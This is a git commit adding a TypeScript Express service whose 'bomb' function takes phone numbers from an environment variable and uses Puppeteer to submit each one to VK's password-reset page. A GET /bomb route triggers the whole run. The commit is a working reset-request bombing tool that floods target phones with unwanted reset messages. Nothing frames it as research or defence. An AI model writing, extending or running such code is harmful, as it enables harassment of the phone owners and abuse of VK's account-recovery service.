8c9b75a828af140a0c2318bd8872032345e52136
Matvey <morozovmatvej75@gmail.com>
2023-04-28 17:52:19 +0300

    go to reset page and type test

--- src/bomb.ts
+++ src/bomb.ts
@@ -1,5 +1,25 @@
 import { Request, Response } from "express";
+import puppeteer from "puppeteer";
+import wait from "./utils/wait";
+import selectors from "./selectors";
+import range from "./utils/range";
 
 export async function bomb(req: Request, res: Response) {
-  
+  const phoneNumbersStr = process.env.PHONE_NUMBERS;
+  if (!phoneNumbersStr) throw new Error("no phone numbers are provided");
+
+  const phoneNumbers = phoneNumbersStr.split(" ");
+
+  phoneNumbers.forEach(async (phoneNumber) => {
+    const browser = await puppeteer.launch({ headless: false });
+    const page = await browser.newPage();
+
+    await page.goto("https://id.vk.com/restore/#/resetPassword");
+    await wait(3000);
+    await page.type(selectors.phoneNumberInput, phoneNumber);
+    await page.keyboard.down("Enter");
+    await wait(3000);
+
+    await browser.close();
+  })
 }
--- src/index.ts
+++ src/index.ts
@@ -1,5 +1,9 @@
+import dotenv from "dotenv";
+dotenv.config();
 import express from "express";
 import { bomb } from "./bomb";
 const app = express();
+const PORT = process.env.PORT ?? 3001;
 
 app.get("/bomb", bomb);
+app.listen(PORT, () => console.log(`app listening on port ${PORT}`));
